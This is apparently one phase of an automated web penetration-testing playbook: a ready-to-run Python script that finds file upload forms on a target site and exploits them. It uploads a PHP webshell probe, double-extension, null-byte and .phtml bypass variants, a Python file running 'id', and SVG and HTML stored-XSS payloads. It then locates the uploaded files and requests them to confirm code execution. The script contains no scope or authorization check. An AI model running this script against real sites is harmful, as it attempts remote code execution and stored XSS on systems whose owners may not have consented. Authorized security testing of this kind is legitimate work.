**Phase 14 — File Upload**

  Test ALL file upload forms for webshell upload and bypass. Run as ONE complete block.
  ```python
  import time, re, os
  from urllib.parse import urljoin
  from bs4 import BeautifulSoup

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_FORMS = _G.get('AUTH_FORMS', [])
  ALL_FORMS  = _G.get('ALL_FORMS', [])
  AUTH_PAGES = _G.get('AUTH_PAGES', {})
  ALL_PAGES  = _G.get('ALL_PAGES', {})

  # Find forms with file upload inputs
  upload_forms = []
  for form in AUTH_FORMS + ALL_FORMS:
      has_file = any(f.get('type') == 'file' for f in form.get('fields', []))
      if has_file:
          upload_forms.append(form)

  # Also probe common upload endpoints
  UPLOAD_PATHS = ['/upload', '/api/upload', '/file/upload', '/files/upload',
                  '/import', '/api/import', '/avatar', '/profile/avatar',
                  '/admin/upload', '/media/upload', '/image/upload']

  for path in UPLOAD_PATHS:
      endpoint = BASE.rstrip('/') + path
      if any(f.get('action', '') == endpoint for f in upload_forms):
          continue
      try:
          r = session.get(endpoint, timeout=6)
          if r.status_code not in (404, 410):
              if 'login' in r.url and 'login' not in endpoint:
                  continue
              soup = BeautifulSoup(r.text, 'html.parser')
              for form in soup.find_all('form'):
                  if form.find('input', {'type': 'file'}):
                      action = form.get('action', '')
                      furl = action if action.startswith('http') else urljoin(endpoint, action or path)
                      fields = []
                      file_field = None
                      for inp in form.find_all(['input', 'textarea', 'select']):
                          n = inp.get('name', '')
                          if not n:
                              continue
                          t = inp.get('type', 'text').lower()
                          if t == 'file':
                              file_field = n
                          else:
                              fields.append({'name': n, 'type': t, 'value': inp.get('value', '')})
                      if file_field:
                          upload_forms.append({
                              'action': furl, 'method': 'post', 'page': endpoint,
                              'fields': fields, 'file_field': file_field
                          })
      except Exception:
          pass

  # Dedup
  seen_actions = set()
  unique_forms = []
  for f in upload_forms:
      key = f.get('action', '')
      if key not in seen_actions:
          seen_actions.add(key)
          unique_forms.append(f)
  upload_forms = unique_forms

  print(f"[UPLOAD] Found {len(upload_forms)} file upload forms")

  # Test payloads — from safe probe to dangerous
  UPLOAD_TESTS = [
      # Test 1: Basic PHP webshell
      {'filename': 'shell.php', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'application/x-php',
       'check': 'UPLOAD_TEST_', 'label': 'PHP webshell'},
      # Test 2: Double extension bypass
      {'filename': 'shell.php.jpg', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'image/jpeg',
       'check': 'UPLOAD_TEST_', 'label': 'double extension bypass'},
      # Test 3: Null byte bypass (legacy)
      {'filename': 'shell.php%00.jpg', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'image/jpeg',
       'check': 'UPLOAD_TEST_', 'label': 'null byte bypass'},
      # Test 4: .phtml / .phar alternatives
      {'filename': 'shell.phtml', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'text/html',
       'check': 'UPLOAD_TEST_', 'label': 'phtml extension'},
      # Test 5: Python (for Flask/Django apps)
      {'filename': 'test.py', 'content': 'import os; print("UPLOAD_TEST_" + os.popen("id").read())', 'content_type': 'text/x-python',
       'check': 'UPLOAD_TEST_', 'label': 'Python upload'},
      # Test 6: SVG with XSS
      {'filename': 'xss.svg', 'content': '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("UPLOAD_XSS")</script></svg>',
       'content_type': 'image/svg+xml', 'check': 'alert("UPLOAD_XSS")', 'label': 'SVG XSS'},
      # Test 7: HTML upload (stored XSS)
      {'filename': 'test.html', 'content': '<html><body><script>alert("UPLOAD_XSS")</script></body></html>',
       'content_type': 'text/html', 'check': 'alert("UPLOAD_XSS")', 'label': 'HTML stored XSS'},
  ]

  upload_findings = []

  for form in upload_forms:
      action = form.get('action', BASE)
      # Find the file input field name
      file_field = form.get('file_field')
      if not file_field:
          for f in form.get('fields', []):
              if f.get('type') == 'file':
                  file_field = f['name']
                  break
      if not file_field:
          file_field = 'file'  # common default

      print(f"\n  Testing upload: POST {action} (file field: {file_field})")

      for test in UPLOAD_TESTS:
          time.sleep(0.5)
          # Build multipart form data
          extra_data = {}
          for f in form.get('fields', []):
              if f.get('type') not in ('file', 'submit', 'button'):
                  extra_data[f['name']] = f.get('value', '') or 'test'

          files = {file_field: (test['filename'], test['content'].encode(), test['content_type'])}
          try:
              r = session.post(action, data=extra_data, files=files, timeout=15, verify=False, allow_redirects=True)
          except Exception as e:
              print(f"    [ERROR] {test['label']}: {e}")
              continue

          print(f"    {test['label']}: HTTP {r.status_code} ({len(r.text)} bytes)")

          # Check if response tells us where the file was saved
          upload_url = None
          body = r.text
          # Look for the uploaded filename or a URL in the response
          fname_base = test['filename'].split('.')[0]
          for pattern in [
              r'(?:href|src|url|path|location)["\s:=]+["\']?([^\s"\'<>]+' + re.escape(test['filename']) + r')',
              r'(?:href|src|url|path|location)["\s:=]+["\']?(/[^\s"\'<>]*/' + re.escape(fname_base) + r'[^\s"\'<>]*)',
              r'"url"\s*:\s*"([^"]+)"',
              r'"path"\s*:\s*"([^"]+)"',
              r'"file"\s*:\s*"([^"]+)"',
          ]:
              m = re.search(pattern, body, re.I)
              if m:
                  upload_url = urljoin(action, m.group(1))
                  break

          # Common upload directories to check
          if not upload_url:
              for upload_dir in ['/uploads/', '/files/', '/media/', '/static/uploads/', '/images/']:
                  guess_url = BASE.rstrip('/') + upload_dir + test['filename']
                  try:
                      r_check = session.get(guess_url, timeout=6)
                      if r_check.status_code == 200 and len(r_check.text) > 10:
                          upload_url = guess_url
                          break
                  except Exception:
                      pass

          if upload_url:
              print(f"    File accessible at: {upload_url}")
              try:
                  r_exec = session.get(upload_url, timeout=10)
                  if test['check'] in r_exec.text:
                      severity = 'CRITICAL' if 'webshell' in test['label'] or 'bypass' in test['label'] else 'HIGH'
                      print(f"[{severity}] File upload vulnerability: {test['label']}")
                      print(f"  Uploaded: {test['filename']} → {upload_url}")
                      print(f"  Content executed/rendered! Evidence: {r_exec.text[:200]}")
                      upload_findings.append({'url': action, 'upload_url': upload_url,
                                              'filename': test['filename'], 'label': test['label'],
                                              'severity': severity, 'evidence': r_exec.text[:300]})
                      break  # confirmed on this form
              except Exception:
                  pass

  if upload_findings:
      _G.setdefault('FINDINGS', [])
      for uf in upload_findings:
          _G['FINDINGS'].append({'severity': uf['severity'], 'title': f"File Upload — {uf['label']}", 'url': uf['url'], 'detail': uf})
      print(f"\n[CRITICAL] File upload vulnerabilities on {len(upload_findings)} form(s)!")
  else:
      print("[INFO] No exploitable file upload found")
  ```
